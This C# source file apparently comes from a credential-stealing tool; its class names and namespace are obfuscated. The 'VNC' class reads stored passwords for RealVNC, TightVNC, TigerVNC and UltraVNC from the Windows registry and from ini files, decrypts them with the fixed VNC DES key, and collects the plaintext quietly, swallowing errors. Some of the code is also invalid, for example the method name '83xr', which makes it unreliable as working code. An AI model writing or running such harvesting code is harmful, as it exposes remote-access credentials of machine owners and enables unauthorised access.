using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using C6Zy;
using JSW1fecBOy;
using Microsoft.Win32;

namespace rk937aHHc
{
	public class VNC : EtbH
	{
		public VNC()
		{
			this.a1aI9yPcSl1 = "";
		}

		public string a1aI9yPcSl1 { get; set; }

		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> results = new List<WTitxI2m>();

			var targets = new List<Tuple<string, string, string>>
			{
				new Tuple<string, string, string>("RealVNC 4.x", @"SOFTWARE\Wow6432Node\RealVNC\WinVNC4", "Password"),
				new Tuple<string, string, string>("RealVNC 3.x", @"SOFTWARE\RealVNC\vncserver", "Password"),
				new Tuple<string, string, string>("RealVNC 4.x", @"SOFTWARE\RealVNC\WinVNC4", "Password"),
				new Tuple<string, string, string>("RealVNC 3.x", @"Software\ORL\WinVNC3", "Password"),
				new Tuple<string, string, string>("TightVNC", @"Software\TightVNC\Server", "Password"),
				new Tuple<string, string, string>("TightVNC", @"Software\TightVNC\Server", "PasswordViewOnly"),
				new Tuple<string, string, string>("TightVNC ControlPassword", @"Software\TightVNC\Server", "ControlPassword"),
				new Tuple<string, string, string>("TigerVNC", @"Software\TigerVNC\Server", "Password")
			};

			foreach (var t in targets)
			{
				RegistryKey key =
					Registry.CurrentUser.OpenSubKey(t.Item2) ??
					Registry.LocalMachine.OpenSubKey(t.Item2);

				if (key == null)
					continue;

				try
				{
					object value = key.GetValue(t.Item3);
					if (value == null)
						continue;

					byte[] encrypted = value is string
						? g3Vt7T2gk5.83xr((string)value)
		                : (byte[])value;

					string password = VNC.Ux2u(encrypted);
					if (string.IsNullOrEmpty(password))
						continue;

					results.Add(new WTitxI2m
					{
						data4 = t.Item1,
						data3 = password.Trim(),
						data1 = "",
						data2 = ""
					});
				}
				catch { }
			}

			var ultraPaths = new List<Tuple<string, string, string>>
			{
				new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles") + @"\UltraVNC\ultravnc.ini", "passwd"),
				new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles") + @"\UltraVNC\ultravnc.ini", "passwd2"),
				new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles(x86)") + @"\UltraVNC\ultravnc.ini", "passwd"),
				new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles(x86)") + @"\UltraVNC\ultravnc.ini", "passwd2"),
				new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles") + @"\uvnc bvba\UltraVNC\ultravnc.ini", "passwd"),
				new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles") + @"\uvnc bvba\UltraVNC\ultravnc.ini", "passwd2"),
				new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles(x86)") + @"\uvnc bvba\UltraVNC\ultravnc.ini", "passwd"),
				new Tuple<string, string, string>("UltraVNC", Environment.GetEnvironmentVariable("ProgramFiles(x86)") + @"\uvnc bvba\UltraVNC\ultravnc.ini", "passwd2")
			};

			foreach (var p in ultraPaths)
			{
				if (!File.Exists(p.Item2))
					continue;

				foreach (string line in File.ReadAllLines(p.Item2))
				{
					if (!line.StartsWith(p.Item3 + "="))
						continue;

					string hex = line.Substring(p.Item3.Length + 1).Trim();
					if (hex.Length > 16)
						hex = hex.Substring(0, 16);

					try
					{
						byte[] encrypted = g3Vt7T2gk5.83xr(hex);
						string password = VNC.Ux2u(encrypted);
						if (string.IsNullOrEmpty(password))
							continue;

						results.Add(new WTitxI2m
						{
							data4 = p.Item1,
							data3 = password.Trim(),
							data1 = "",
							data2 = ""
						});
					}
					catch { }
				}
			}

			return results;
		}

		private static string Ux2u(byte[] data)
		{
			if (data == null || data.Length == 0)
				return string.Empty;

			byte[] key = new byte[]
			{
				23, 82, 107, 6, 35, 78, 88, 7
			};

			byte[] realKey = new byte[8];
			for (int i = 0; i < 8; i++)
			{
				byte b = key[i];
				realKey[i] = (byte)(
					((b & 0x01) << 7) |
					((b & 0x02) << 5) |
					((b & 0x04) << 3) |
					((b & 0x08) << 1) |
					((b & 0x10) >> 1) |
					((b & 0x20) >> 3) |
					((b & 0x40) >> 5) |
					((b & 0x80) >> 7)
				);
			}

			byte[] output = new byte[data.Length];

			using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
			{
				des.Mode = CipherMode.ECB;
				des.Padding = PaddingMode.None;

				using (ICryptoTransform decryptor = des.CreateDecryptor(realKey, null))
				{
					decryptor.TransformBlock(data, 0, data.Length, output, 0);
				}
			}

			return Encoding.ASCII.GetString(output);
		}
	}
}
